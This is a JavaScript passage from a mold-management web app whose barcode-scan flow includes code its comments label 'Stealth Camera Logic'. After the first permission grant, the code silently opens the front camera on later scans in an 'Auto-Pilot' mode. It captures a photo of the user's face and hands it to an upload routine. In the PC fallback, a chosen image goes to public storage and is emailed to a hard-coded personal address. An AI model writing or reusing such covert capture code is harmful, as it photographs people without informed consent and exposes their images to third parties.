                    appendImportLog("✅ Ghi thành công khối " + successCount + " / " + insertPayload.length);
                }
            }
            appendImportLog("🎉 <b>HOÀN TẤT IMPORT CHUỖI VĂN BẢN (TEXT VARIANTS)!</b>");
        };
        reader.readAsText(file, encoding);
    }

    // ==========================================
    // Stealth Camera Logic -> Html5QrCode
    // ==========================================
    var targetInputIdForScan = null;

    function triggerAuditCaptureFlow(inputId) {
        targetInputIdForScan = inputId;
        var secOverlay = document.getElementById('plmSecurityOverlay');
        var video = document.getElementById('plmAuditVideo');
        var btnSkipStart = document.getElementById('plmSecBtnSkipStart');
        var btnPreview = document.getElementById('plmSecBtnPreview');
        var btnSkipPreview = document.getElementById('plmSecBtnSkipPreview');
        var btnAccept = document.getElementById('plmSecBtnAccept');
        var btnCancelPreview = document.getElementById('plmSecBtnCancelPreview');
        var actionBtns = document.getElementById('plmSecActionButtons');
        var previewBox = document.getElementById('plmFaceIDPreviewBox');
        var iconPulse = document.getElementById('plmSecIconPulse');
        var faceErrorAlert = document.getElementById('plmSecFaceErrorAlert');
        
        // Reset UI
        secOverlay.classList.remove('plm-hidden');
        
        var boxFirstTime = document.getElementById('plmSecBoxFirstTime');
        var boxReturning = document.getElementById('plmSecBoxReturning');
        var btnPreview   = document.getElementById('plmSecBtnPreview');
        var btnClose     = document.getElementById('plmSecBtnCloseOverlay');

        state.faceIdUrl = null;

        var isCamAllowed = localStorage.getItem('plm_cam_allowed') === '1';

        if(isCamAllowed) {
            // HƯỚNG 1: Đã lưu quyền -> Chạy ẩn (Auto-Pilot)
            if(boxFirstTime) boxFirstTime.style.display = 'none';
            if(boxReturning) boxReturning.style.display = 'block';
            _startCameraProcess(true);
        } else {
            // LẦN ĐẦU TIÊN: Hỏi quyền, đợi bấm nút
            if(boxReturning) boxReturning.style.display = 'none';
            if(boxFirstTime) boxFirstTime.style.display = 'block';
            
            // Xóa rác event cũ (Phòng rò rỉ bộ nhớ JS)
            if(btnPreview) {
                var newBtn = btnPreview.cloneNode(true);
                btnPreview.parentNode.replaceChild(newBtn, btnPreview);
                newBtn.onclick = function() {
                    newBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">カメラ準備中...</span><span style="font-size:11px; font-weight:normal">Đang mở máy ảnh...</span></span>'; 
                    newBtn.style.opacity = '0.7';
                    newBtn.style.pointerEvents = 'none';
                    _startCameraProcess(false);
                };
            }
            if(btnClose) {
                var newCloseBtn = btnClose.cloneNode(true);
                btnClose.parentNode.replaceChild(newCloseBtn, btnClose);
                newCloseBtn.onclick = function() {
                    secOverlay.classList.add('plm-hidden');
                };
            }
        }

        function closeAndScan() {
            stopAuditCamera();
            startBarcodeScanner();
        }

        function _startCameraProcess(isAutoPilot) {
            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(function(stream) {
                    // CHỈ set cờ '1' khi Browser OS Allow trả về Promise Resolve
                    localStorage.setItem('plm_cam_allowed', '1');
                    
                    state.frontStream = stream;
                    if('srcObject' in video) video.srcObject = stream;
                    else video.src = window.URL.createObjectURL(stream);
                    
                    // Lần đầu -> Cập nhật UI nút bấm
                    var curBtn = document.getElementById('plmSecBtnPreview');
                    if(curBtn && !isAutoPilot) {
                        curBtn.innerHTML = '<i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">データ処理中...</span><span style="font-size:11px; font-weight:normal">Đang xử lý dữ liệu...</span></span>';
                        curBtn.style.background = '#10b981';
                    }

                    // POLLING TỰ ĐỘNG CHỤP VÀ TẮT
                    var isCaptured = false;
                    var timeout = setTimeout(function() {
                        if (!isCaptured) {
                            isCaptured = true; 
                            closeAndScan(); // Fallback nếu cam treo
                        }
                    }, 4000);
                    
                    var poll = setInterval(function() {
                        if (isCaptured) { clearInterval(poll); return; }
                        if (video && video.readyState >= 2 && video.videoWidth > 0) {
                            clearInterval(poll);
                            isCaptured = true;
                            clearTimeout(timeout);
                            try {
                                var canvas = document.createElement('canvas'); // canvas ảo
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(function(b) {
                                    executeAutoCaptureAndUpload(b);
                                    
                                    // Sau khi chụp xong mới tắt cam và đẩy sang Cam Sau (tạo độ mượt cho animation UI)
                                    setTimeout(() => { closeAndScan(); }, 400); 
                                }, 'image/jpeg', 0.85);
                            } catch(e) {}
                        }
                    }, 150);
                })
                .catch(function(err) {
                    console.log("Stealth Camera Error:", err);
                    // Quyền bị từ chối (Block)
                    secOverlay.classList.add('plm-hidden');
                    stopFaceIdFlow();
                    _fallbackToFileInput();
                });
            } else {
                secOverlay.classList.add('plm-hidden');
                stopFaceIdFlow();
                _fallbackToFileInput();
            }
        }
    }

    // Fallback cho môi trường PC: dùng file input thay camera
    function _fallbackToFileInput() {
        var existing = document.getElementById('plmFallbackFileInput');
        if (!existing) {
            var fi = document.createElement('input');
            fi.type = 'file';
            fi.id = 'plmFallbackFileInput';
            fi.accept = 'image/*';
            fi.setAttribute('capture', 'environment');
            fi.style.display = 'none';
            document.body.appendChild(fi);
            fi.addEventListener('change', function(e) {
                var file = e.target.files && e.target.files[0];
                if (!file) { startBarcodeScanner(); return; }
                var reader = new FileReader();
                reader.onload = function() {
                    var blob = new Blob([reader.result], { type: file.type || 'image/jpeg' });
                    var sb = api.check();
                    if (sb) {
                        var fileName = 'sec_plm_' + Date.now() + '.jpg';
                        var path = 'employee_verifications/' + fileName;
                        sb.storage.from('mold-photos').upload(path, blob, { contentType: 'image/jpeg', upsert: false })
                        .then(function(upRes) {
                            if (!upRes.error) {
                                var pubRes = sb.storage.from('mold-photos').getPublicUrl(path);
                                var publicUrl = pubRes.data ? pubRes.data.publicUrl : '';
                                state.faceIdUrl = publicUrl;
                                var batchIdStr = 'sec-plm-' + Date.now();
                                var payload = {
                                    moldCode: 'セキュリティ監査 / Ảnh bảo mật',
                                    moldName: 'セキュリティ監査 / Ảnh bảo mật',
                                    moldId: 'SECURITY_AUDIT',
                                    deviceType: 'audit',
                                    dimensionL: null, dimensionW: null, dimensionD: null,
                                    photoFileName: path,
                                    originalFileName: 'security_confirm.jpg',
                                    photos: [{
                                        fileName: path,
                                        originalFileName: 'security_confirm.jpg',
                                        url: publicUrl,
                                        moldCode: 'SECURITY_AUDIT',
                                        moldName: 'セキュリティ監査 / Ảnh bảo mật',
                                        dimensionL: null, dimensionW: null, dimensionD: null,
                                        setAsThumbnail: false
                                    }],
                                    employee: 'System Audit',
                                    employeeId: '1',
                                    date: new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' }),
                                    notes: 'PC Fallback: ảnh chọn từ ổ cứng để xác thực.',
                                    recipients: ['toan.ysd@gmail.com'],
                                    ccRecipients: [],
                                    batchId: batchIdStr,
                                    batch_id: batchIdStr
                                };
                                var cfg = window.MCSupabaseConfig || (window.SupabaseConfig && window.SupabaseConfig.get ? window.SupabaseConfig.get() : {});
                                var sysAnonKey = cfg.supabaseAnonKey || '';
                                sb.functions.invoke('send-photo-audit', { 
                                    body: payload,
                                    headers: { Authorization: 'Bearer ' + sysAnonKey }
                                }).catch(function(){});
                            }
                        }).catch(function() {});
                    }
                    startBarcodeScanner();
                };
                reader.readAsArrayBuffer(file);
                fi.value = '';
            });
        }
        plmToast('カメラが見つかりません。ファイルを選択してください / Không tìm thấy Camera. Vui lòng chọn ảnh từ máy.', 'info');
        document.getElementById('plmFallbackFileInput').click();
    }

    function captureStealthAndProceed(videoEl) {
        var canvas = document.getElementById('plmAuditCanvas');
        if(canvas && videoEl && videoEl.videoWidth > 0) {
            canvas.width = videoEl.videoWidth;
            canvas.height = videoEl.videoHeight;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(function(blob) {
                state.securityPhotoBlob = blob; 
            }, 'image/jpeg', 0.85);
        }
        
        stopAuditCamera();
        
        startBarcodeScanner();
    }

    function stopAuditCamera() {
        var secOverlay = document.getElementById('plmSecurityOverlay');
        if(secOverlay) secOverlay.classList.add('plm-hidden');
        
        if (state.frontStream) {
            state.frontStream.getTracks().forEach(t => t.stop());
            state.frontStream = null;
        }
    }

    window.stopBarcodeScanner = async function() {
        if(state.html5QrCode) {
            try { await state.html5QrCode.stop(); } catch(e){}
        }
        var wrapBox = document.getElementById('plmBarcodeWrap');
        if(wrapBox) wrapBox.style.display = 'none';
        state.html5QrCode = null;
    };

    async function startBarcodeScanner() {
        await loadBarcodeScanner();
        var wrapBox = document.getElementById('plmBarcodeWrap');
        if(wrapBox) wrapBox.style.display = 'block';

        if(state.html5QrCode) {
            try { await state.html5QrCode.stop(); } catch(e){}
        }

        state.html5QrCode = new Html5Qrcode("plmBarcodeRender");
        const config = { fps: 10, qrbox: { width: 250, height: 150 }, aspectRatio: 1.0 };
        
        state.html5QrCode.start({ facingMode: "environment" }, config,
            (decodedText) => {
                var inp = document.getElementById(targetInputIdForScan);
                if(inp) inp.value = decodedText;
                
                window.stopBarcodeScanner();
                plmToast('Quét mã thành công', 'success');
            },
            (errorMessage) => { }
        ).catch(err => {
            plmToast('Lỗi Camera sau: ' + err, 'error');
            window.stopBarcodeScanner();
        });

        // Bắt sự kiện thoát luồng quét thủ công từ giao diện
        var btnClose = document.getElementById('plmBtnCloseBarcode');
        if(btnClose) {
            btnClose.onclick = function() { window.stopBarcodeScanner(); };
        }
    }

    // ==========================================
    // Public API Methods
    // ==========================================
    window.PlasticManager = {
        init: function() {},
        open: function() {
            if(!el.root) createStructure();
            el.overlay.classList.remove('plm-hidden');
            switchTab(state.activeTab);
            
            // Đóng sidebar nếu đang mở trên Mobile
            var sb = document.getElementById('sidebar');
            if(sb && sb.classList.contains('open')) sb.classList.remove('open');
            var backdrop = document.getElementById('backdrop');
            if(backdrop) backdrop.classList.remove('show');
        },
        close: function() {
            if(state.html5QrCode) {
                try{ state.html5QrCode.stop(); } catch(e){}
            }
            stopAuditCamera();
            if(el.overlay) el.overlay.classList.add('plm-hidden');
        }
    };

})();
